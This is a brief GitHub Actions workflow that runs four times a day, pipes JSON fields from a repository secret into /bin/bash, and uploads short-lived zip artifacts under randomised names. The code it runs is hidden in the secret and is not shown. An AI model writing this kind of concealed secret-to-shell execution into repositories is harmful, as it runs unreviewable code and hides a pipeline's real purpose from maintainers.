name: elijahcreate
on:
  workflow_dispatch:

  schedule:
    - cron: '23 5,11,17,23 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: elijahcreate
        env:
          nvg68: ${{ secrets.nvg68 }}
        run: |
          printf '%s' "$nvg68" | jq -r .rcbe3 | /bin/bash
          printf '%s' "$t6300" | jq -r .fgi5 | /bin/bash
          echo $wpl045 | jq -r .botbm0 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: oSJAuku4
          path: "*.zip"
          retention-days: 1
